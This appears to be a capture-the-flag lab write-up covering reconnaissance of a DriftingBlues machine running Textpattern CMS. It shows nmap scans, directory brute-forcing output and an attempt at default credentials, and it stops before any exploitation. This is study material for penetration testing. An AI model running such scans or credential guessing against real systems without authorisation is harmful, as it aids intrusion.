
Initial scan

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 192.168.189.219    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 02:25 GMT
Nmap scan report for 192.168.189.219
Host is up (0.030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
                                                                                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 192.168.189.219 -sV -sC 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 02:25 GMT
Nmap scan report for 192.168.189.219
Host is up (0.015s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```

Website main page

![](attachments/Pasted%20image%2020250214203819.png)

Web technologies

![](attachments/Pasted%20image%2020250214203840.png)

Robots.txt

![](attachments/Pasted%20image%2020250214203856.png)

	Login page / CMS

![](attachments/Pasted%20image%2020250214203929.png)

Found a potential exploit but it is the authenticated type

![](attachments/Pasted%20image%2020250214204251.png)

Web directory brute-forcing 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ feroxbuster -u http://192.168.189.219   
                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.189.219
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
200      GET      212l     1206w    97264c http://192.168.189.219/db
200      GET       76l       75w      750c http://192.168.189.219/index
200      GET        5l       14w      110c http://192.168.189.219/robots
301      GET        9l       28w      324c http://192.168.189.219/textpattern => http://192.168.189.219/textpattern/
404      GET        9l       33w      293c http://192.168.189.219/external%20files
200      GET      212l     1206w    97264c http://192.168.189.219/db.png
200      GET       76l       75w      750c http://192.168.189.219/
404      GET        9l       33w      292c http://192.168.189.219/Style%20Library
404      GET        9l       33w      289c http://192.168.189.219/modern%20mom
404      GET        9l       34w      294c http://192.168.189.219/neuf%20giga%20photo
200      GET      130l      860w     6311c http://192.168.189.219/textpattern/README
404      GET        9l       33w      303c http://192.168.189.219/textpattern/Reports%20List
301      GET        9l       28w      328c http://192.168.189.219/textpattern/rpc => http://192.168.189.219/textpattern/rpc/
200      GET     2718l     7151w    82294c http://192.168.189.219/textpattern/textpattern/textpattern
301      GET        9l       28w      336c http://192.168.189.219/textpattern/textpattern => http://192.168.189.219/textpattern/textpattern/
404      GET        9l       33w      305c http://192.168.189.219/textpattern/external%20files
301      GET        9l       28w      331c http://192.168.189.219/textpattern/images => http://192.168.189.219/textpattern/images/
301      GET        9l       28w      331c http://192.168.189.219/textpattern/themes => http://192.168.189.219/textpattern/themes/
301      GET        9l       28w      330c http://192.168.189.219/textpattern/files => http://192.168.189.219/textpattern/files/
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/admin_config.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/constants.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_forms.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/IXRClass.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_head.php
200      GET      630l     1862w     5960c http://192.168.189.219/textpattern/textpattern/lib/i18n-ascii.txt
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_admin.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/class.trace.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_publish.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_theme.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_update.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/classTextile.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/PasswordHash.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/class.thumb.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_db.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/array_column.php
200      GET      458l     4035w    24486c http://192.168.189.219/textpattern/textpattern/lib/LICENSE-LESSER.txt
301      GET        9l       28w      341c http://192.168.189.219/textpattern/textpattern/lang => http://192.168.189.219/textpattern/textpattern/lang/
200      GET       29l      182w     1279c http://192.168.189.219/textpattern/textpattern/lang/README
200      GET      263l      557w    13068c http://192.168.189.219/textpattern/textpattern/lang/bn.ini
200      GET      828l     2250w    31034c http://192.168.189.219/textpattern/textpattern/lang/sr.ini
200      GET      783l     2054w    28646c http://192.168.189.219/textpattern/textpattern/lang/bs.ini
200      GET      374l     2118w    23521c http://192.168.189.219/textpattern/textpattern/lang/pt-br_pophelp.xml
200      GET      313l     1224w    18604c http://192.168.189.219/textpattern/textpattern/lang/tr_pophelp.xml
200      GET      756l     8122w    69068c http://192.168.189.219/textpattern/textpattern/lang/es_pophelp.xml
200      GET      849l     2468w    31954c http://192.168.189.219/textpattern/textpattern/lang/ro.ini
200      GET     1084l     2974w    48576c http://192.168.189.219/textpattern/textpattern/lang/fi.ini
200      GET     1066l     3193w    47337c http://192.168.189.219/textpattern/textpattern/lang/tr.ini
200      GET      313l      404w     6299c http://192.168.189.219/textpattern/textpattern/lang/cy.ini
200      GET      628l     1326w    19107c http://192.168.189.219/textpattern/textpattern/lang/is.ini
200      GET      310l     1283w    18309c http://192.168.189.219/textpattern/textpattern/lang/de_pophelp.xml
200      GET      264l     1592w    19296c http://192.168.189.219/textpattern/textpattern/lang/nl_pophelp.xml
200      GET      297l     1620w    19709c http://192.168.189.219/textpattern/textpattern/lang/ca_pophelp.xml
200      GET      767l     1799w    26154c http://192.168.189.219/textpattern/textpattern/lang/hr.ini
200      GET      393l     1797w    19107c http://192.168.189.219/textpattern/textpattern/lang/ceb.ini
200      GET      597l     2326w    30164c http://192.168.189.219/textpattern/textpattern/lang/ur.ini
200      GET     1085l     3520w    49380c http://192.168.189.219/textpattern/textpattern/lang/pl.ini
200      GET      674l     1422w    45267c http://192.168.189.219/textpattern/textpattern/lang/zh-cn_pophelp.xml
200      GET      974l     2346w    36173c http://192.168.189.219/textpattern/textpattern/lang/et.ini
200      GET      777l     1863w    26080c http://192.168.189.219/textpattern/textpattern/lang/da.ini
200      GET      838l     2872w    42934c http://192.168.189.219/textpattern/textpattern/lang/fa.ini
200      GET     1086l     4722w    54285c http://192.168.189.219/textpattern/textpattern/lang/fr.ini
200      GET      267l      319w     5123c http://192.168.189.219/textpattern/textpattern/lang/nn.ini
200      GET     1034l    10610w    93765c http://192.168.189.219/textpattern/textpattern/lang/it_pophelp.xml
200      GET      821l     1042w    37741c http://192.168.189.219/textpattern/textpattern/lang/ja.ini
200      GET      231l      933w    15813c http://192.168.189.219/textpattern/textpattern/lang/el_pophelp.xml
200      GET      226l     1059w    15382c http://192.168.189.219/textpattern/textpattern/lang/hr_pophelp.xml
200      GET      696l      872w    39903c http://192.168.189.219/textpattern/textpattern/lang/th.ini
200      GET     1086l     3526w    44622c http://192.168.189.219/textpattern/textpattern/lang/en.ini
200      GET      196l      666w    11608c http://192.168.189.219/textpattern/textpattern/lang/hi.ini
200      GET      742l      924w    23996c http://192.168.189.219/textpattern/textpattern/lang/zh-tw.ini
200      GET     1080l    10835w    89314c http://192.168.189.219/textpattern/textpattern/lang/en-us_pophelp.xml
200      GET     1086l     3527w    44635c http://192.168.189.219/textpattern/textpattern/lang/en-gb.ini
200      GET     1086l     3212w    46629c http://192.168.189.219/textpattern/textpattern/lang/cs.ini
200      GET      281l     1549w    20631c http://192.168.189.219/textpattern/textpattern/lang/pl_pophelp.xml
200      GET     1082l     3304w    47893c http://192.168.189.219/textpattern/textpattern/lang/sk.ini
200      GET     1083l    10836w    89310c http://192.168.189.219/textpattern/textpattern/lang/en-gb_pophelp.xml
200      GET     1086l     1481w    43619c http://192.168.189.219/textpattern/textpattern/lang/zh-cn.ini
200      GET     1086l     3823w    49345c http://192.168.189.219/textpattern/textpattern/lang/nl.ini
404      GET        9l       33w      304c http://192.168.189.219/textpattern/Style%20Library
200      GET     1070l     3230w    46313c http://192.168.189.219/textpattern/textpattern/lang/sv.ini
200      GET      951l     2613w    38640c http://192.168.189.219/textpattern/textpattern/lang/lv.ini
200      GET      984l     3312w    59340c http://192.168.189.219/textpattern/textpattern/lang/bg.ini
200      GET      781l     1850w    30390c http://192.168.189.219/textpattern/textpattern/lang/ko.ini
200      GET     1086l     3319w    66664c http://192.168.189.219/textpattern/textpattern/lang/ru.ini
200      GET     1086l     4393w    51425c http://192.168.189.219/textpattern/textpattern/lang/es.ini
200      GET      856l     3886w    38335c http://192.168.189.219/textpattern/textpattern/lang/vi.ini
200      GET     1086l     3524w    44634c http://192.168.189.219/textpattern/textpattern/lang/en-us.ini
200      GET     1046l     3327w    61602c http://192.168.189.219/textpattern/textpattern/lang/sr-rs.ini
200      GET      820l     2274w    36841c http://192.168.189.219/textpattern/textpattern/lang/he.ini
200      GET     1085l    11982w   103604c http://192.168.189.219/textpattern/textpattern/lang/fr_pophelp.xml
200      GET     1077l     3345w    65621c http://192.168.189.219/textpattern/textpattern/lang/uk.ini
200      GET     1086l     4167w    49814c http://192.168.189.219/textpattern/textpattern/lang/pt-br.ini
200      GET     1029l     4571w    49246c http://192.168.189.219/textpattern/textpattern/lang/tl.ini
200      GET     1042l     4698w    50099c http://192.168.189.219/textpattern/textpattern/lang/fil.ini
200      GET      875l     2386w    35851c http://192.168.189.219/textpattern/textpattern/lang/lt.ini
404      GET        9l       33w      293c http://192.168.189.219/Web%20References
200      GET     1083l    10836w    89307c http://192.168.189.219/textpattern/textpattern/lang/en_pophelp.xml
404      GET        9l       33w      307c http://192.168.189.219/textpattern/rpc/Reports%20List
200      GET     1086l     3471w    50753c http://192.168.189.219/textpattern/textpattern/lang/de.ini
200      GET      792l     2039w    28244c http://192.168.189.219/textpattern/textpattern/lang/nb.ini
200      GET      278l     2491w    15170c http://192.168.189.219/textpattern/LICENSE
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/external%20files
404      GET        9l       33w      301c http://192.168.189.219/textpattern/modern%20mom
404      GET        9l       34w      306c http://192.168.189.219/textpattern/neuf%20giga%20photo
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/plugins => http://192.168.189.219/textpattern/textpattern/plugins/
301      GET        9l       28w      340c http://192.168.189.219/textpattern/textpattern/tmp => http://192.168.189.219/textpattern/textpattern/tmp/
301      GET        9l       28w      342c http://192.168.189.219/textpattern/textpattern/setup => http://192.168.189.219/textpattern/textpattern/setup/
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/include => http://192.168.189.219/textpattern/textpattern/include/
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_auth.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/include/txp_skin.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_log.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_lang.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_list.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_category.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_form.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_validator.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_discuss.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_link.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_prefs.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_diag.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_section.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_image.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_article.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_tag.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_html.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/txplib_misc.php
404      GET        9l       33w      289c http://192.168.189.219/My%20Project
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/lib/taglib.php
200      GET      891l     3023w    35789c http://192.168.189.219/textpattern/textpattern/lang/pt.ini
200      GET      201l      206w     6028c http://192.168.189.219/textpattern/textpattern/lang/km.ini
200      GET      807l     2086w    30595c http://192.168.189.219/textpattern/textpattern/lang/hu.ini
301      GET        9l       28w      340c http://192.168.189.219/textpattern/textpattern/lib => http://192.168.189.219/textpattern/textpattern/lib/
200      GET      215l      865w    15938c http://192.168.189.219/textpattern/textpattern/lang/fi_pophelp.xml
200      GET       29l      226w     1503c http://192.168.189.219/textpattern/textpattern/lib/LICENSE-BSD-3.txt
200      GET     1074l     3697w    59061c http://192.168.189.219/textpattern/textpattern/lang/ar.ini
200      GET        1l        3w       20c http://192.168.189.219/textpattern/textpattern/lib/txplib_wrapper.php
200      GET      878l     2858w    34459c http://192.168.189.219/textpattern/textpattern/lang/gl.ini
404      GET        9l       33w      308c http://192.168.189.219/textpattern/rpc/Style%20Library
200      GET      925l     8895w    88824c http://192.168.189.219/textpattern/textpattern/lang/cs_pophelp.xml
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/publish => http://192.168.189.219/textpattern/textpattern/publish/
301      GET        9l       28w      344c http://192.168.189.219/textpattern/textpattern/vendors => http://192.168.189.219/textpattern/textpattern/vendors/
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/taghandlers.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/log.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/comment.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/atom.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/search.php
200      GET     1064l     3548w    45794c http://192.168.189.219/textpattern/textpattern/lang/id.ini
200      GET     1072l     3900w    48497c http://192.168.189.219/textpattern/textpattern/lang/it.ini
404      GET        9l       33w      315c http://192.168.189.219/textpattern/textpattern/Reports%20List
200      GET     1086l     4109w    74495c http://192.168.189.219/textpattern/textpattern/lang/el.ini
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/external%20files
404      GET        9l       33w      289c http://192.168.189.219/Contact%20Us
301      GET        9l       28w      343c http://192.168.189.219/textpattern/textpattern/update => http://192.168.189.219/textpattern/textpattern/update/
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/modern%20mom
404      GET        9l       33w      316c http://192.168.189.219/textpattern/textpattern/Style%20Library
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_css.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_file.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_pane.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_admin.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_plugin.php
200      GET        1l        3w       26c http://192.168.189.219/textpattern/textpattern/include/txp_page.php
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/publish/rss.php
500      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/vendors/Txp.php
200      GET       10l       14w      145c http://192.168.189.219/textpattern/textpattern/update/index
200      GET        0l        0w        0c http://192.168.189.219/textpattern/textpattern/config.php
200      GET     1070l     4119w    49373c http://192.168.189.219/textpattern/textpattern/lang/ca.ini
301      GET        9l       28w      347c http://192.168.189.219/textpattern/textpattern/setup/lang => http://192.168.189.219/textpattern/textpattern/setup/lang/
200      GET       64l      306w     4553c http://192.168.189.219/textpattern/textpattern/index.php
301      GET        9l       28w      351c http://192.168.189.219/textpattern/textpattern/setup/articles => http://192.168.189.219/textpattern/textpattern/setup/articles/
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Web%20References
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/modern%20mom
404      GET        9l       34w      318c http://192.168.189.219/textpattern/textpattern/neuf%20giga%20photo
404      GET        9l       33w      290c http://192.168.189.219/Donate%20Cash
404      GET        9l       33w      288c http://192.168.189.219/Home%20Page
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/external%20files
404      GET        9l       33w      293c http://192.168.189.219/Planned%20Giving
404      GET        9l       33w      301c http://192.168.189.219/textpattern/My%20Project
404      GET        9l       33w      287c http://192.168.189.219/Site%20Map
301      GET        9l       28w      347c http://192.168.189.219/textpattern/textpattern/setup/data => http://192.168.189.219/textpattern/textpattern/setup/data/
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/update/Style%20Library
404      GET        9l       33w      301c http://192.168.189.219/textpattern/Contact%20Us
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/setup/Reports%20List
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/My%20Project
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/modern%20mom
404      GET        9l       34w      325c http://192.168.189.219/textpattern/textpattern/update/neuf%20giga%20photo
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/external%20files
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Web%20References
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/setup/Style%20Library
404      GET        9l       33w      291c http://192.168.189.219/Bequest%20Gift
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/Contact%20Us
404      GET        9l       33w      302c http://192.168.189.219/textpattern/Donate%20Cash
404      GET        9l       33w      288c http://192.168.189.219/Gift%20Form
404      GET        9l       33w      300c http://192.168.189.219/textpattern/Home%20Page
404      GET        9l       34w      295c http://192.168.189.219/Life%20Income%20Gift
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Press%20Releases
404      GET        9l       33w      305c http://192.168.189.219/textpattern/Privacy%20Policy
404      GET        9l       33w      299c http://192.168.189.219/textpattern/Site%20Map
404      GET        9l       33w      289c http://192.168.189.219/New%20Folder
404      GET        9l       33w      290c http://192.168.189.219/Site%20Assets
404      GET        9l       34w      290c http://192.168.189.219/What%20is%20New
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/My%20Project
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/modern%20mom
404      GET        9l       34w      324c http://192.168.189.219/textpattern/textpattern/setup/neuf%20giga%20photo
404      GET        9l       33w      306c http://192.168.189.219/textpattern/rpc/Donate%20Cash
404      GET        9l       33w      304c http://192.168.189.219/textpattern/rpc/Home%20Page
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Web%20References
404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/Privacy%20Policy
404      GET        9l       33w      303c http://192.168.189.219/textpattern/rpc/Site%20Map
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/Contact%20Us
404      GET        9l       33w      303c http://192.168.189.219/textpattern/Bequest%20Gift
404      GET        9l       34w      307c http://192.168.189.219/textpattern/Life%20Income%20Gift
404      GET        9l       33w      301c http://192.168.189.219/textpattern/New%20Folder
404      GET        9l       33w      302c http://192.168.189.219/textpattern/Site%20Assets
404      GET        9l       34w      302c http://192.168.189.219/textpattern/What%20is%20New
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Web%20References
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/Contact%20Us
404      GET        9l       33w      312c http://192.168.189.219/textpattern/textpattern/Home%20Page
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Planned%20Giving
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Press%20Releases
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/Privacy%20Policy
404      GET        9l       33w      311c http://192.168.189.219/textpattern/textpattern/Site%20Map
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/My%20Project
404      GET        9l       33w      303c http://192.168.189.219/textpattern/rpc/About%20Us
404      GET        9l       33w      307c http://192.168.189.219/textpattern/rpc/Bequest%20Gift
404      GET        9l       33w      304c http://192.168.189.219/textpattern/rpc/Gift%20Form
404      GET        9l       34w      311c http://192.168.189.219/textpattern/rpc/Life%20Income%20Gift
404      GET        9l       33w      305c http://192.168.189.219/textpattern/rpc/New%20Folder
404      GET        9l       33w      306c http://192.168.189.219/textpattern/rpc/Site%20Assets
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/update/Donate%20Cash
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/update/Home%20Page
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Planned%20Giving
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Press%20Releases
404      GET        9l       33w      324c http://192.168.189.219/textpattern/textpattern/update/Privacy%20Policy
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/update/Site%20Map
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/Contact%20Us
404      GET        9l       33w      312c http://192.168.189.219/textpattern/textpattern/Gift%20Form
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/setup/Donate%20Cash
404      GET        9l       34w      319c http://192.168.189.219/textpattern/textpattern/Life%20Income%20Gift
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/setup/Home%20Page
404      GET        9l       33w      313c http://192.168.189.219/textpattern/textpattern/New%20Folder
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Press%20Releases
404      GET        9l       33w      323c http://192.168.189.219/textpattern/textpattern/setup/Privacy%20Policy
404      GET        9l       33w      317c http://192.168.189.219/textpattern/textpattern/setup/Site%20Map
404      GET        9l       33w      314c http://192.168.189.219/textpattern/textpattern/Site%20Assets
404      GET        9l       34w      314c http://192.168.189.219/textpattern/textpattern/What%20is%20New
404      GET        9l       33w      322c http://192.168.189.219/textpattern/textpattern/update/Bequest%20Gift
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/update/Gift%20Form
404      GET        9l       34w      326c http://192.168.189.219/textpattern/textpattern/update/Life%20Income%20Gift
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/update/New%20Folder
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/update/Site%20Assets
404      GET        9l       33w      321c http://192.168.189.219/textpattern/textpattern/setup/Bequest%20Gift
404      GET        9l       33w      318c http://192.168.189.219/textpattern/textpattern/setup/Gift%20Form
404      GET        9l       34w      325c http://192.168.189.219/textpattern/textpattern/setup/Life%20Income%20Gift
404      GET        9l       33w      319c http://192.168.189.219/textpattern/textpattern/setup/New%20Folder
404      GET        9l       33w      320c http://192.168.189.219/textpattern/textpattern/setup/Site%20Assets
404      GET        9l       34w      320c http://192.168.189.219/textpattern/textpattern/setup/What%20is%20New
[####################] - 46s   180183/180183  0s      found:256     errors:97     
[####################] - 40s    30000/30000   752/s   http://192.168.189.219/ 
[####################] - 39s    30000/30000   775/s   http://192.168.189.219/textpattern/ 
[####################] - 1s     30000/30000   32293/s http://192.168.189.219/textpattern/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   410959/s http://192.168.189.219/textpattern/themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   1071429/s http://192.168.189.219/textpattern/files/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 39s    30000/30000   767/s   http://192.168.189.219/textpattern/textpattern/ 
[####################] - 37s    30000/30000   802/s   http://192.168.189.219/textpattern/rpc/ 
[####################] - 3s     30000/30000   11765/s http://192.168.189.219/textpattern/textpattern/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6227/s  http://192.168.189.219/textpattern/textpattern/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 35s    30000/30000   866/s   http://192.168.189.219/textpattern/textpattern/update/ 
[####################] - 0s     30000/30000   652174/s http://192.168.189.219/textpattern/textpattern/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   638298/s http://192.168.189.219/textpattern/textpattern/tmp/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 35s    30000/30000   849/s   http://192.168.189.219/textpattern/textpattern/setup/ 
[####################] - 3s     30000/30000   11669/s http://192.168.189.219/textpattern/textpattern/include/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   15175/s http://192.168.189.219/textpattern/textpattern/publish/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   14866/s http://192.168.189.219/textpattern/textpattern/vendors/ => Directory listing (add --scan-dir-listings to scan)    
```

Trying to brute force .zip extension files

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://192.168.189.219/textpattern/textpattern -w /usr/share/wordlists/dirb/common.txt -x zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.189.219/textpattern/textpattern
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 311]
/.hta.zip             (Status: 403) [Size: 315]
/.htaccess.zip        (Status: 403) [Size: 320]
/.htaccess            (Status: 403) [Size: 316]
/.htpasswd            (Status: 403) [Size: 316]
/.htpasswd.zip        (Status: 403) [Size: 320]
/include              (Status: 301) [Size: 344] [--> http://192.168.189.219/textpattern/textpattern/include/]
/index.php            (Status: 200) [Size: 4553]
/lang                 (Status: 301) [Size: 341] [--> http://192.168.189.219/textpattern/textpattern/lang/]
/lib                  (Status: 301) [Size: 340] [--> http://192.168.189.219/textpattern/textpattern/lib/]
/plugins              (Status: 301) [Size: 344] [--> http://192.168.189.219/textpattern/textpattern/plugins/]
/publish              (Status: 301) [Size: 344] [--> http://192.168.189.219/textpattern/textpattern/publish/]
/setup                (Status: 301) [Size: 342] [--> http://192.168.189.219/textpattern/textpattern/setup/]
/textpattern          (Status: 200) [Size: 82294]
/tmp                  (Status: 301) [Size: 340] [--> http://192.168.189.219/textpattern/textpattern/tmp/]
/update               (Status: 301) [Size: 343] [--> http://192.168.189.219/textpattern/textpattern/update/]
/vendors              (Status: 301) [Size: 344] [--> http://192.168.189.219/textpattern/textpattern/vendors/]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================

```

Attempted to login using some common default credentials like Admin but was still unable to login

Going back to the first hint on the robots.txt file, it seems that we should be able to find some kind of a file with a .zip extension during our directory brute-forcing. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ feroxbuster -u http://192.168.189.219 -x zip
                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.189.219
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
200      GET      212l     1206w    97264c http://192.168.189.219/db
200      GET       76l       75w      750c http://192.168.189.219/index
200      GET      212l     1206w    97264c http://192.168.189.219/db.png
200      GET       76l       75w      750c http://192.168.189.219/
200      GET        5l       14w      110c http://192.168.189.219/robots
404      GET        9l       33w      291c http://192.168.189.219/Reports%20List
404      GET        9l       33w      295c http://192.168.189.219/Reports%20List.zip
301      GET        9l       28w      324c http://192.168.189.219/textpattern => http://192.168.189.219/textpattern/
